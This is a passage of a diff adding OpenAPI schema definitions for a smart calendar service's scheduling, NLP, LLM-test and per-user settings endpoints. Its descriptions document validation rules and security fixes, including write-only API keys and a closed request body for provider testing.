+        week:
+          type: string
+          format: date
+          description: >
+            `YYYY-MM-DD`. Snapped back to that week's Monday by startOfWeek(),
+            then Mon..Fri (5 days) are evaluated.
+      additionalProperties: true
+
+    CompressionResult:
+      type: object
+      description: engine.CompressionResult. camelCase.
+      properties:
+        date:
+          type: string
+          description: '`YYYY-MM-DD` as produced by the engine.'
+        proposals:
+          type: array
+          nullable: true
+          items:
+            $ref: '#/components/schemas/MoveProposal'
+        totalFocusGainMinutes:
+          type: integer
+      required: [date, proposals, totalFocusGainMinutes]
+      additionalProperties: false
+
+    MoveProposal:
+      type: object
+      description: engine.MoveProposal - the RESPONSE shape (camelCase).
+      properties:
+        eventId:
+          type: string
+        eventTitle:
+          type: string
+        currentStart:
+          type: string
+          format: date-time
+        currentEnd:
+          type: string
+          format: date-time
+        proposedStart:
+          type: string
+          format: date-time
+        proposedEnd:
+          type: string
+          format: date-time
+        reason:
+          type: string
+        focusGainMinutes:
+          type: integer
+      required:
+        - eventId
+        - eventTitle
+        - currentStart
+        - currentEnd
+        - proposedStart
+        - proposedEnd
+        - reason
+        - focusGainMinutes
+      additionalProperties: false
+
+    CompressionApplyRequest:
+      type: object
+      properties:
+        proposals:
+          type: array
+          items:
+            $ref: '#/components/schemas/CompressionApplyProposal'
+      additionalProperties: true
+
+    CompressionApplyProposal:
+      type: object
+      description: >
+        The anonymous struct in api.applyRequest. snake_case, and only these
+        three fields are read - unknown members are ignored by encoding/json.
+      properties:
+        event_id:
+          type: string
+        proposed_start:
+          type: string
+          format: date-time
+          description: RFC3339. Unparseable -> the proposal lands in `failed`, no error.
+        proposed_end:
+          type: string
+          format: date-time
+      additionalProperties: true
+
+    CompressionApplyResult:
+      type: object
+      description: 'Literal map with keys `applied` and `failed`.'
+      properties:
+        applied:
+          type: array
+          nullable: true
+          items:
+            type: string
+          description: Event ids the engine moved.
+        failed:
+          type: array
+          nullable: true
+          items:
+            type: string
+          description: >
+            Mixed contents: handler-side entries read
+            `"<event_id>: invalid time format"`, engine-side entries are appended
+            verbatim by Compressor.Apply.
+      required: [applied, failed]
+      additionalProperties: false
+
+    # ------------------------------------------------------- smart scheduling
+
+    ScheduleSuggestRequest:
+      type: object
+      description: Anonymous struct in scheduleHandlers.suggestMeeting. snake_case.
+      properties:
+        duration_minutes:
+          type: integer
+          description: Not validated by the handler; 0 is accepted.
+        attendees:
+          type: array
+          items:
+            type: string
+            format: email
+        range_start:
+          type: string
+          format: date-time
+          description: RFC3339. Required in practice - a parse failure is a 400.
+        range_end:
+          type: string
+          format: date-time
+          description: RFC3339. Required in practice.
+        title:
+          type: string
+      required: [range_start, range_end]
+      additionalProperties: true
+
+    ScheduleSuggestions:
+      type: object
+      description: engine.ScheduleSuggestions.
+      properties:
+        slots:
+          type: array
+          nullable: true
+          description: At most 3 entries; `null` when no candidate survived.
+          items:
+            $ref: '#/components/schemas/SuggestedSlot'
+      required: [slots]
+      additionalProperties: false
+
+    SuggestedSlot:
+      type: object
+      description: engine.SuggestedSlot.
+      properties:
+        start:
+          type: string
+          format: date-time
+        end:
+          type: string
+          format: date-time
+        score:
+          type: integer
+          description: >
+            Integer score from scoreCandidate + adjustScoreForPreferences.
+            No documented range or normalisation.
+        reasons:
+          type: array
+          nullable: true
+          items:
+            type: string
+      required: [start, end, score, reasons]
+      additionalProperties: false
+
+    ScheduleCreateRequest:
+      type: object
+      description: Anonymous struct in scheduleHandlers.createMeeting. snake_case.
+      properties:
+        title:
+          type: string
+          description: Becomes the Google event Summary. Not required by the handler.
+        start:
+          type: string
+          format: date-time
+          description: RFC3339. Parse failure -> 400.
+        end:
+          type: string
+          format: date-time
+          description: RFC3339. Parse failure -> 400.
+        attendees:
+          type: array
+          items:
+            type: string
+            format: email
+        description:
+          type: string
+        location:
+          type: string
+      required: [start, end]
+      additionalProperties: true
+
+    GoogleCalendarEvent:
+      type: object
+      description: >
+        The raw `google.golang.org/api/calendar/v3.Event` returned by the
+        calendar client and re-encoded as-is. Only the members this repo sets or
+        reads are listed; the real payload carries the full Google Calendar
+        event resource and omits empty fields (the generated struct uses
+        `omitempty` almost everywhere).
+      x-uncertain: >
+        This schema is deliberately open (`additionalProperties: true`) and
+        partial. The exact member set is fixed by the vendored Google API client
+        version, not by this repo. A human should decide whether the contract
+        pins a normalised subset instead of leaking the vendor struct.
+      properties:
+        id:
+          type: string
+        summary:
+          type: string
+        description:
+          type: string
+        location:
+          type: string
+        status:
+          type: string
+        htmlLink:
+          type: string
+        hangoutLink:
+          type: string
+        start:
+          $ref: '#/components/schemas/GoogleEventDateTime'
+        end:
+          $ref: '#/components/schemas/GoogleEventDateTime'
+        attendees:
+          type: array
+          items:
+            $ref: '#/components/schemas/GoogleEventAttendee'
+      additionalProperties: true
+
+    GoogleEventDateTime:
+      type: object
+      description: calendar/v3.EventDateTime. This repo only ever sets `dateTime`.
+      properties:
+        dateTime:
+          type: string
+          format: date-time
+        date:
+          type: string
+          format: date
+        timeZone:
+          type: string
+      additionalProperties: true
+
+    GoogleEventAttendee:
+      type: object
+      description: calendar/v3.EventAttendee. This repo only ever sets `email`.
+      properties:
+        email:
+          type: string
+          format: email
+        displayName:
+          type: string
+        organizer:
+          type: boolean
+        responseStatus:
+          type: string
+        optional:
+          type: boolean
+      additionalProperties: true
+
+    # ------------------------------------------------------------------- nlp
+
+    NLPParseRequest:
+      type: object
+      properties:
+        text:
+          type: string
+          minLength: 1
+          description: Empty string -> 400 `missing text field`.
+      required: [text]
+      additionalProperties: true
+
+    NLPParseResult:
+      type: object
+      description: >
+        nlp.ParseResult. snake_case - the only snake_case RESPONSE body in this
+        domain. Every field except `intent` carries `omitempty`, so absent
+        members are normal.
+      properties:
+        intent:
+          type: string
+          description: >
+            Values observed in the code and prompts: `schedule_meeting`,
+            `schedule_focus`, `unknown`. The field is a plain string with no
+            server-side validation, and the value ultimately comes from the LLM,
+            so other values are possible.
+          examples: [schedule_meeting, schedule_focus, unknown]
+        title:
+          type: string
+        duration_minutes:
+          type: integer
+        attendees:
+          type: array
+          items:
+            type: string
+        range_start:
+          type: string
+          format: date-time
+          description: >
+            Go `time.Time` with omitempty - which does NOT omit the zero time,
+            so a missing value may still serialise as `0001-01-01T00:00:00Z`.
+        range_end:
+          type: string
+          format: date-time
+          description: Same zero-time caveat as range_start.
+        preferred_times:
+          type: array
+          items:
+            type: string
+          description: 'Free-form windows, e.g. `"10:00-12:00"`.'
+        avoid_times:
+          type: array
+          items:
+            type: string
+        constraints:
+          type: string
+          description: Reused as the event Description by /api/nlp/confirm.
+        timezone_notes:
+          type: string
+        error:
+          type: string
+          description: >
+            Set (with intent `unknown`) when the LLM call fails or returns
+            invalid JSON - still HTTP 200.
+        suggested_slots:
+          type: array
+          items:
+            $ref: '#/components/schemas/SuggestedSlot'
+        participant_infos:
+          type: array
+          items:
+            $ref: '#/components/schemas/ParticipantInfo'
+      required: [intent]
+      additionalProperties: false
+
+    ParticipantInfo:
+      type: object
+      description: calendar.ParticipantInfo (backend/calendar/participants.go).
+      properties:
+        email:
+          type: string
+          format: email
+        timezone:
+          type: string
+          description: Empty string = unknown.
+        workStart:
+          type: string
+          description: '`HH:MM` or empty.'
+        workEnd:
+          type: string
+          description: '`HH:MM` or empty.'
+      required: [email, timezone, workStart, workEnd]
+      additionalProperties: false
+
+    NLPConfirmRequest:
+      type: object
+      properties:
+        parse_result:
+          $ref: '#/components/schemas/NLPParseResult'
+        selected_slot_index:
+          type: integer
+          description: >
+            Index into `parse_result.suggested_slots`. Only the upper bound is
+            checked; see the operation's x-uncertain note about negatives.
+      required: [parse_result, selected_slot_index]
+      additionalProperties: true
+
+    # ------------------------------------------------------------------- llm
+
+    LLMTestRequest:
+      type: object
+      description: >
+        Optional body for POST /api/llm/test. Added by PAC-24 to close API-037.
+
+        **This schema is a closed list of three properties and that is the whole
+        point of it.** Not one of them can contribute to the URL the server
+        requests, so no submitted value can direct a stored or ambient credential
+        anywhere. The endpoint properties a probe might plausibly want to
+        override - `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`,
+        `azureDeployment`, `azureApiVersion`, `awsRegion`, `awsProfile`,
+        `bedrockModel`, `gcpProject`, `gcpLocation`, `vertexModel` - are
+        DELIBERATELY ABSENT and are a 400 via `additionalProperties: false`. The
+        operation description carries the full argument, including why an
+        all-or-nothing body (endpoint plus credential together) does not close
+        the channel on the three ambient-credential providers.
+
+        An absent body, or `{}`, probes the caller's stored configuration - the
+        pre-PAC-24 behaviour. `{"llmApiKey": "sk-..."}` probes an unsaved key
+        against the caller's stored endpoint, which is the case the settings UI
+        needs because a stored key can no longer be read back to re-submit.
+
+        This is deliberately NOT `SettingsUpdate`. Sharing that schema would
+        re-admit every endpoint property by inheritance, which is precisely the
+        defect this shape exists to prevent, and would make a probe read like a
+        write. The three property names match the corresponding SettingsFields
+        ones so a client can build this from the document it already holds.
+
+        `llmApiKey` here is `writeOnly` for the same reason it is on
+        SettingsFields: it is accepted and is never echoed, including in the 400
+        and 502 bodies (spec AC-14). Nothing submitted here is persisted.
+      properties:
+        llmProvider:
+          type: string
+          enum: ['', openai, anthropic, ollama, bedrock, azure_openai, vertex]
+          description: >
+            Which provider branch of `nlp.NewLLMClientFromSettings` to probe.
+            Selects the client; it does not select a host. On `openai` and
+            `anthropic` the host is the caller's stored `llmBaseUrl` (or the
+            vendor default when that is empty); on the other four it is built
+            entirely from the caller's stored endpoint properties. Spec AC-15.
+        llmModel:
+          type: string
+          description: >
+            Consulted only by the `openai` and `anthropic` branches
+            (`backend/nlp/llm_factory.go:25,34`), where it is a field of the JSON
+            request body. It never appears in a URL. `bedrockModel`,
+            `azureDeployment` and `vertexModel` - which DO appear in URLs - are
+            not accepted here.
+        llmApiKey:
+          type: string
+          writeOnly: true
+          description: >
+            An unsaved key to probe. Used only as the `Authorization` header
+            value sent to the caller's stored endpoint
+            (`backend/nlp/parser.go:43`). Ignored by the four branches that take
+            no key. Never persisted and never echoed (spec AC-14).
+      additionalProperties: false
+
+    LLMTestResult:
+      type: object
+      description: 'Literal map: `{"ok": true, "response": ..., "provider": ...}`.'
+      properties:
+        ok:
+          type: boolean
+          description: Always literal `true` on the 200 path.
+        response:
+          type: string
+          description: The provider's completion text for the fixed "Say hello" prompt.
+        provider:
+          type: string
+          enum: ['', openai, anthropic, ollama, bedrock, azure_openai, vertex]
+          description: >
+            Echo of the `llmProvider` that was actually probed - the submitted
+            one when a body was sent, the caller's stored one otherwise; empty
+            string when unset. It is what tells a client which configuration the
+            result is about. It never carries the key.
+      required: [ok, response, provider]
+      additionalProperties: false
+
+    # -------------------------------------------------------------- settings
+
+    DaySchedule:
+      type: object
+      description: storage.DaySchedule. No omitempty - all three always serialise.
+      properties:
+        enabled:
+          type: boolean
+        start:
+          type: string
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
+          description: >
+            `HH:MM`, validated with a shape check AND `time.Parse("15:04")`, so
+            `25:00` is rejected. Empty string allowed when `enabled` is false.
+            PAC-24 corrected the pattern: the previous `^[0-9]{2}:[0-9]{2}$`
+            both admitted `99:99` (which the server rejects) and forbade the
+            empty string (which the server accepts and which GET returns for a
+            disabled day) - it was wrong in both directions.
+        end:
+          type: string
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
+      required: [enabled, start, end]
+      additionalProperties: false
+
+    WorkingHoursSchedule:
+      type: object
+      description: >
+        storage.WorkingHoursSchedule. Replaced WHOLE by a PATCH that mentions it;
+        there is no deep merge (spec AC-9).
+
+        **Normalised on read** by `Settings.normalizeSchedules`
+        (`backend/storage/settings.go:92-106`), which `loadScheduleFields` calls
+        on every read path (`:495`): an empty `mode` becomes
+        `{mode: all_days, default: {enabled: true, start: workStart or 09:00,
+        end: workEnd or 18:00}, days: {}}`; an `all_days` document whose
+        `default` is entirely empty (`enabled:false, start:"", end:""`) has that
+        default replaced the same way (`:95-99`); and a nil `days` map becomes
+        `{}`.
+
+        **So `{"mode":"all_days","default":{"enabled":false,"start":"","end":""},
+        "days":{}}` is NOT a document GET can return** - the `:95-99` branch
+        rewrites it before it reaches the wire. That matters because it is the
+        one document the shipped consumer cannot render: `normalizeInterval`
+        rejects an empty `start`/`end` and returns `undefined`
+        (`smart-calendar-flow/src/api/client.ts:477-488`), `normalizeWorkingHours`
+        then returns `undefined` because `default` is undefined and `days` is
+        empty (`:505-517`), and `normalizeSettings` reaches
+        `delete out.working_hours` (`:543`) - the per-day section disappears with
+        no error and no empty state, which is the silent blank spec AC-20 exists
+        to end.
+
+        The `by_day` arm of the same shape IS reachable, because `:95-99` guards
+        on `mode == "all_days"`: `{"mode":"by_day", …, "days":{}}` normalises to
+        itself and produces the identical `undefined` in the consumer. PAC-24
+        closes it at the point of entry rather than describing it - a `by_day`
+        document must carry at least one weekday (400:
+        `workingHours.days must contain at least one weekday when mode is
+        by_day`). `by_day` with no days also means "this user never works",
+        which no consumer intends and which `WorkWindow` already renders as
+        `enabled:false` for every day (`:117-121`).
+      properties:
+        mode:
+          type: string
+          enum: ['', all_days, by_day]
+          description: >
+            Compared case-insensitively after trimming during validation
+            (`backend/api/handlers_settings.go:128`), but the persisted value is
+            whatever was sent.
+
+            `''` is in the enum because the server accepts it
+            (`:129`, `mode != "" && mode != "all_days" && mode != "by_day"`) and
+            because the contract must describe what is, not what should be
+            (factory §7). Revision 1 of this contract omitted `''` while the
+            description two lines below said it was accepted - a schema
+            disagreeing with its own prose. It is accepted on write ONLY when
+            `days` is empty; otherwise it is the existing 400
+            `workingHours.mode is required when day-specific hours are provided`
+            (`:132-134`). That conditional is cross-property and OpenAPI cannot
+            express it, so it stays a documented 400 rather than becoming a
+            schema narrowing - narrowing here would be a NEW rejection, and spec
+            §6 requires both tests in
+            `backend/api/handlers_settings_schedule_test.go` to keep passing
+            unchanged.
+
+            A GET never returns `''`, because normalisation rewrites it.
+        default:
+          $ref: '#/components/schemas/DaySchedule'
+          description: >
+            Only validated when `mode == "all_days"` and at least one of
+            enabled/start/end is set. Ignored by WorkWindow() in by_day mode.
+        days:
+          type: object
+          description: >
+            Keys are lowercase English weekday names, and PAC-24 makes that a
+            schema constraint rather than a warning. `validateSchedulePreferences`
+            lowercases before checking
+            (`backend/api/handlers_settings.go:145`,
+            `validScheduleWeekdays[strings.ToLower(day)]`), so `"Monday"` passes
+            validation and is stored - but `WorkWindow` looks the day up as
+            `strings.ToLower(day.Weekday().String())`
+            (`backend/storage/settings.go:117`), so the entry can never match and
+            the user's Monday hours are silently inert forever. Under the
+            whole-object replace this is worse than it was: the write that
+            installs the dead key also deletes the live key it replaced.
+            `propertyNames` makes the dead key a 400 instead of a document that
+            says so. In `by_day` mode a missing weekday means "not working".
+          propertyNames:
+            enum: [monday, tuesday, wednesday, thursday, friday, saturday, sunday]
+          additionalProperties:
+            $ref: '#/components/schemas/DaySchedule'
+      required: [mode, default, days]
+      additionalProperties: false
+
+    LunchBreakSchedule:
+      type: object
+      description: >
+        storage.LunchBreakSchedule - a bare map keyed by lowercase weekday name.
+        Normalised to `{}` (never null) on read
+        (`backend/storage/settings.go:103-105`). A per-day entry overrides the
+        legacy global `lunchStart`/`lunchEnd`/`protectLunch` trio, including
+        disabling lunch for that day. Replaced whole by a PATCH that mentions it;
+        `lunchBreaks: {}` clears every per-day override (spec AC-9).
+
+        `propertyNames` is added by PAC-24 for the same reason as on
+        `WorkingHoursSchedule.days`: the validator lowercases the key before
+        checking (`backend/api/handlers_settings.go:154`) but `LunchWindow` looks
+        it up already-lowercased (`backend/storage/settings.go:138`), so a
+        `"Monday"` key validates, stores, and never matches.
+      propertyNames:
+        enum: [monday, tuesday, wednesday, thursday, friday, saturday, sunday]
+      additionalProperties:
+        $ref: '#/components/schemas/DaySchedule'
+
+    SettingsFields:
+      type: object
+      description: >
+        The property set shared by the GET response (`Settings`) and the PATCH /
+        PATCH body (`SettingsUpdate`). Property names come straight from
+        the json tags on storage.Settings - camelCase throughout. `ID`,
+        `MicrosoftTokens` and `ZoomTokens` are `json:"-"` and never appear on the
+        wire.
+
+        Two properties are asymmetric and are marked as such rather than being
+        split into two schemas, so that a document read from GET can be submitted
+        back unchanged (which is what the shipped frontend does):
+        `llmApiKey` is `writeOnly` - accepted on write, never returned; and
+        `llmApiKeySet` and `updatedAt` are `readOnly` - returned, accepted and
+        ignored on write. Everything else is symmetric.
+
+        No property other than `llmApiKey` carries omitempty, so the GET response
+        always contains all of them.
+      properties:
+        workStart:
+          type: string
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
+          description: >
+            `HH:MM`, OR THE EMPTY STRING. DB default `09:00`. PAC-24 tightened
+            the shape from `^[0-9]{2}:[0-9]{2}$`, which admitted `99:99` (the
+            server's own check was the same loose regexp, so `99:99` was
+            stored), and at the same time widened it to admit `""`, which the
+            server both accepts and returns.
+
+            `""` is not a modelling slip, it is the state the data is in.
+            `validateSettings` skips the format check exactly when the value is
+            empty (`backend/api/handlers_settings.go:75`,
+            `if val != "" && !timePattern.MatchString(val)`), and every row
+            zeroed by API-004 - the defect this feature exists to repair -
+            already holds `""` in this column, because the pre-PAC-24 full
+            replace persisted each omitted property as its Go zero value. A
+            strict `HH:MM` pattern would make day-one GETs fail the contract they
+            were generated from, and the generated zod schema would reject the
+            body before any UI saw it. It is also what makes spec AC-7
+            satisfiable: `{"workStart": ""}` is the documented way to clear this
+            setting, and under the merge rule a present property is stored
+            exactly as given.
+
+            Consumers already treat `""` as meaningful rather than as damage:
+            `WorkWindow` falls back to `09:00`/`18:00` when the effective start
+            or end is empty (`backend/storage/settings.go:124-127`).
+            The same widening, for the same reason, was already applied to
+            `DaySchedule.start`/`end`. Contrast `recapSendTime`, which is
+            NOT widened - see its own description.
+        workEnd:
+          type: string
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
+          description: >
+            `HH:MM` or `""`, as `workStart`. DB default `18:00`. PAC-24 adds the
+            cross-property check that workEnd > workStart, which OpenAPI cannot
+            express; it is a 400 (`workEnd must be after workStart`). That check
+            applies only when BOTH values are non-empty, which is the existing
+            handler behaviour and keeps `""` a clear rather than a 400. Before
+            PAC-24 an inverted working day was accepted and produced a
+            zero-length day at use (API-082).
+        timezone:
+          type: string
+          description: >
+            IANA name, e.g. `Europe/Paris`. DB default `UTC`. PAC-24 validates
+            it with time.LoadLocation and returns 400
+            `timezone is not a known IANA location`. Before PAC-24 any string was
+            accepted and every engine silently fell back to UTC, so a typo moved
+            a user's whole schedule with no error anywhere (API-082).
+        focusMinBlockMinutes:
+          type: integer
+          minimum: 0
+          description: 'Rejected when < 0. DB default 25.'
+        focusMaxBlockMinutes:
+          type: integer
+          minimum: 0
+          description: >
+            Rejected when < 0. DB default 120. PAC-24 adds the cross-property
+            check focusMinBlockMinutes <= focusMaxBlockMinutes, which OpenAPI
+            cannot express; it is a 400 (API-082).
+        focusDailyTargetMinutes:
+          type: integer
+          minimum: 0
+          description: 'Rejected when < 0. DB default 240.'
+        outOfHoursMeetingsPerWeek:
+          type: integer
+          minimum: 0
+          description: >
+            Weekly allowance of meetings outside working hours. 0 disables
+            out-of-hours scheduling entirely (canScheduleOutOfHours returns
+            false when <= 0).
+        autoDeclineOutsideWorkingHours:
+          type: boolean
+        focusLabel:
+          type: string
+          description: 'DB default `Focus Time`.'
+        focusColor:
+          type: string
+          description: 'Hex colour string. Not validated. DB default `#4F46E5`.'
+        lunchStart:
+          type: string
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
+          description: >
+            `HH:MM` or `""`. DB default `12:00`. Legacy global; overridden
+            per-day by lunchBreaks. `""` here is the strongest case of the four:
+            it is not merely tolerated but LOAD-BEARING. `LunchWindow` returns
+            `enabled: false` precisely when `lunchStart` or `lunchEnd` is empty
+            (`backend/storage/settings.go:141-142`), so `""` is how "this user
+            has no protected lunch" is represented. Forbidding it in the schema
+            would make an existing, meaningful state unrepresentable.
+        lunchEnd:
+          type: string
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
+          description: >
+            `HH:MM` or `""`, as `lunchStart`. DB default `13:00`. PAC-24 adds the
+            cross-property check lunchEnd > lunchStart as a 400 (API-082),
+            applied only when both values are non-empty.
+        protectLunch:
+          type: boolean
+          description: 'DB default true.'
+        bufferBeforeMinutes:
+          type: integer
+          minimum: 0
+          description: 'Rejected when < 0. DB default 5.'
+        bufferAfterMinutes:
+          type: integer
+          minimum: 0
+          description: 'Rejected when < 0. DB default 5.'
+        bufferEnabled:
+          type: boolean
+        bufferMinMeetingMinutes:
+          type: integer
+          minimum: 0
+          description: >
+            PAC-24 adds the `>= 0` check its two siblings already had; before
+            that a negative value was accepted here alone (API-082).
+        bufferSkipBackToBack:
+          type: boolean
+        workingHours:
+          $ref: '#/components/schemas/WorkingHoursSchedule'
+        lunchBreaks:
+          $ref: '#/components/schemas/LunchBreakSchedule'
+        compressionEnabled:
+          type: boolean
+        autoScheduleEnabled:
+          type: boolean
+        autoScheduleCron:
+          type: string
+          description: >
+            5-field cron (minute hour dom month dow), parsed with
+            robfig/cron v3 using exactly those five fields. Empty string skips
+            validation. DB default `0 8 * * *`.
+        llmProvider:
+          type: string
+          enum: ['', openai, anthropic, ollama, bedrock, azure_openai, vertex]
+          description: Empty string is explicitly allowed by validLLMProviders.
+        llmModel:
+          type: string
+          description: >
+            Provider default applied at call time when empty: `gpt-4o-mini`
+            (openai), `claude-haiku-4-5-20251001` (anthropic).
+        llmApiKey:
+          type: string
+          writeOnly: true
+          description: >
+            WRITE-ONLY. Accepted on write; never present in any response from
+            any operation (spec AC-11). Required for openai and anthropic.
+
+            Under the merge semantics this needs no special case: omit it and
+            the stored key is unchanged; send `""` and it is cleared; send a
+            value and it is replaced (spec AC-13). There is no way to read it
+            back, by design - someone who loses their key re-enters it. Do not
+            add a reveal affordance later.
+
+            Before PAC-24 it was returned in cleartext from a row shared by every
+            authenticated account (API-002 + API-003), and wiped by any write that
+            omitted it (API-004). Every key configured before this ships must be
+            treated as compromised and rotated - closing the read path does not
+            un-expose it (spec §5, OQ-5).
+        llmApiKeySet:
+          type: boolean
+          readOnly: true
+          description: >
+            `true` exactly when the stored key is non-empty. This is the only
+            thing a reader learns about the key, and it is what lets a client
+            distinguish "not configured" from "configured" without disclosing
+            anything (spec AC-12).
+
+            `readOnly`, so a client that submits back a document it just read
+            may include it; it is accepted and ignored (spec AC-10). It is NOT
+            the way to clear a key - send `llmApiKey: ""` for that.
+        llmBaseUrl:
+          type: string
+          description: Also the legacy fallback for the ollama base URL.
+        awsRegion:
+          type: string
+        awsProfile:
+          type: string
+        bedrockModel:
+          type: string
+        azureEndpoint:
+          type: string
+        azureDeployment:
+          type: string
+        azureApiVersion:
+          type: string
+        gcpProject:
+          type: string
+        gcpLocation:
+          type: string
+        vertexModel:
+          type: string
+        ollamaBaseUrl:
+          type: string
+          description: 'Falls back to llmBaseUrl, then `http://localhost:11434`.'
+        ollamaModel:
+          type: string
+          description: 'Falls back to llmModel, then `llama3.2`.'
+        calendarProvider:
+          type: string
+          enum: [google, outlook, webcal]
+          description: >
+            DB default `google`. Which calendar the product reads and writes for
+            THIS user.
+
+            Resolves U-18. The authoritative set was settled by reading the three
+            consumers that switch on this value - calendar.NewProvider
+            (`backend/calendar/client_factory.go:16,22,27`), the auth-status
+            handler (`backend/api/handlers_auth.go:97,105,111`) and the free/busy
+            service (`backend/engine/freebusy_service.go:122`). All three accept
+            exactly `outlook` and `webcal` and treat every other value, including
+            a typo, as Google. PAC-24 enforces the set; before it, an unknown
+            value was stored and silently behaved as `google`.
+
+            Before PAC-24 this was a property of the singleton row, so one user
+            connecting Outlook switched the whole deployment
+            (`backend/auth/microsoft_oauth.go:57` writes
+            `calendar_provider = 'outlook' WHERE id = 1`).
+        webcalUrl:
+          type: string
+        calendarEmail:
+          type: string
+          description: >
+            The address of THIS user's connected calendar. Before PAC-24 the
+            auth-status handler served the singleton row's value to everyone
+            (API-009).
+        conferencingProvider:
+          type: string
+          enum: [meet, zoom, teams]
+          description: >
+            Read with `COALESCE(conferencing_provider,'meet')`; conference.NewProvider
+            switches on `zoom`, `teams`, and treats everything else as `meet`.
+            So the wire values are `meet` / `zoom` / `teams`, not the frontend's
+            `google_meet` / `zoom` / `teams` / `custom`. PAC-24 enforces the set
+            for the same reason as calendarProvider: an unknown value was stored
+            and silently behaved as `meet`.
+        recapEnabled:
+          type: boolean
+        recapSendTime:
+          type: string
+          pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
+          description: >
+            `HH:MM`, in the same form on read and on write. **STRICT: unlike the
+            four legacy clock properties above, `""` is NOT admitted here, in
+            either direction.** The three reasons are specific to this column and
+            do not generalise:
+
+            (a) There is no empty state to represent. The column is
+            `TIME NOT NULL DEFAULT '08:00'` (`015_daily_recap.up.sql:3`), and the
+            write path passes every value through
+            `recapSendTimeOrDefault` (`backend/storage/settings.go:356-361`),
+            which turns `""` into `08:00`. So no row can hold an empty send time
+            and no GET can return one - the `COALESCE(...,'')` at `:224` and
+            `:439` is defensive and unreachable. This is the difference from
+            `workStart`/`lunchStart`, where `""` both exists in the data and
+            carries meaning.
+
+            (b) Admitting `""` would make this contract lie about its own merge
+            rule. `PATCH /api/settings` states that a property present is set to
+            exactly the value given; `""` here would instead be silently
+            rewritten to `08:00`. A client asking to clear a value and being told
+            `200` while the server stored something it did not ask for is the
+            exact silent-success failure mode this contract refuses for `null`.
+
+            (c) PAC-24 therefore removes the substitution: `""` is a 400
+            (`recapSendTime must be in HH:MM format`), which is the same message
+            spec AC-17 already requires for a malformed value and which AC-16
+            requires instead of an internal failure.
+
+            **This requires a narrow amendment to spec AC-7**, which as written
+            says an empty value of a setting's type always clears it. AC-7 must
+            exempt `recapSendTime` on the ground that it has no empty state. The
+            contract author may not edit the spec; the amendment is named in
+            `contracts/features/PAC-24.md` §"Revision 2" and must be made before
+            stage 3.
+
+            Resolves U-19, and resolves it by CHANGING the server rather than by
+            documenting what it did. The column is Postgres `TIME`
+            (`015_daily_recap.up.sql:3`) and was read as `recap_send_time::TEXT`,
+            which renders `HH:MM:SS` (`08:00:00`, with a fractional part when one
+            was stored) - contradicting the struct comment that claims `HH:MM`
+            and contradicting the write format, so no client could round-trip
+            this value. PAC-24 renders the column to `HH:MM` on read and rejects
+            anything else on write. Note: the marker was originally to be settled
+            by observing a live response; it is settled here by fixing the
+            asymmetry instead, which makes the observation unnecessary. Spec
+            AC-16 is the integration test that proves the rendered form.
+        recapSendTo:
+          type: string
+          enum: [dm, channel]
+          description: >
+            DB CHECK constraint enforces this. PAC-24 validates it on the settings
+            write too; before that only the daily-recap PATCH did, so a bad value
+            sent to PUT /api/settings reached the DB CHECK and surfaced as a 500
+            (API-081).
+        recapChannelId:
+          type: string
+        recapIncludeBriefs:
+          type: boolean
+          description: 'DB default true.'
+        recapIncludeFocus:
+          type: boolean
+          description: >
+            DB default true. Exposed as `include_focus_blocks` by the daily-recap
+            endpoints.
+        recapIncludeHabits:
+          type: boolean
+          description: 'DB default true.'
+        updatedAt:
+          type: string
+          format: date-time
+          readOnly: true
+          description: >
+            Server-managed (NOW() on every write). May be present in a request
+            body - a client submitting back a document it just read will include
+            it - and is ignored (spec AC-10).
+      additionalProperties: false
+
+    Settings:
+      description: >
+        The settings document for ONE user, returned by GET and by PATCH.
+        Every property is always present except `llmApiKey`,
+        which is `writeOnly` and therefore never present (spec AC-11);
+        `llmApiKeySet` takes its place in the required list.
+      allOf:
+        - $ref: '#/components/schemas/SettingsFields'
+      required:
+        - workStart
+        - workEnd
+        - timezone
+        - focusMinBlockMinutes
+        - focusMaxBlockMinutes
+        - focusDailyTargetMinutes
+        - outOfHoursMeetingsPerWeek
+        - autoDeclineOutsideWorkingHours
+        - focusLabel
+        - focusColor
+        - lunchStart
+        - lunchEnd
+        - protectLunch
+        - bufferBeforeMinutes
+        - bufferAfterMinutes
+        - bufferEnabled
+        - bufferMinMeetingMinutes
+        - bufferSkipBackToBack
+        - workingHours
+        - lunchBreaks
+        - compressionEnabled
+        - autoScheduleEnabled
+        - autoScheduleCron
+        - llmProvider
+        - llmModel
+        - llmApiKeySet
+        - llmBaseUrl
+        - awsRegion
+        - awsProfile
+        - bedrockModel
+        - azureEndpoint
+        - azureDeployment
+        - azureApiVersion
+        - gcpProject
+        - gcpLocation
+        - vertexModel
+        - ollamaBaseUrl
+        - ollamaModel
+        - calendarProvider
+        - webcalUrl
+        - calendarEmail
+        - conferencingProvider
+        - recapEnabled
+        - recapSendTime
+        - recapSendTo
+        - recapChannelId
+        - recapIncludeBriefs
+        - recapIncludeFocus
+        - recapIncludeHabits
+        - updatedAt
+
+    SettingsUpdate:
+      description: >
+        PATCH /api/settings body - the only settings write. Nothing is required:
+        a property absent means "leave it as it is", and `{}` is a valid no-op
+        request. A property present is applied exactly as given - `""`, `0` and
+        `false` are values, not absences.
+
+        No property is nullable, so `null` anywhere in this body is a 400 rather
+        than a silent no-op (spec AC-8). `additionalProperties: false` is
+        inherited from SettingsFields, so an unknown property - including a
+        snake_case spelling of a real one - is rejected rather than ignored;
+        that is what makes API-013 detectable instead of silent.
+
+        `workingHours` and `lunchBreaks` are replaced whole when present, not
+        deep-merged (spec AC-9). `llmApiKeySet` and `updatedAt` are `readOnly`
+        and are accepted and ignored.
+
+        Before PAC-24 this was the body of `PUT /api/settings`, a replace: every
+        omitted property was persisted as its Go zero value (API-004). That
+        operation is removed, not deprecated - its only consumer
+        (`smart-calendar-flow/src/api/client.ts:813`) sends snake_case names that
+        `additionalProperties: false` refuses on either method, so a deprecated
+        alias would have shielded nothing.
+      allOf:
+        - $ref: '#/components/schemas/SettingsFields'
+
+    # ----------------------------------------------------------- daily recap
+
+    DailyRecapSettings:
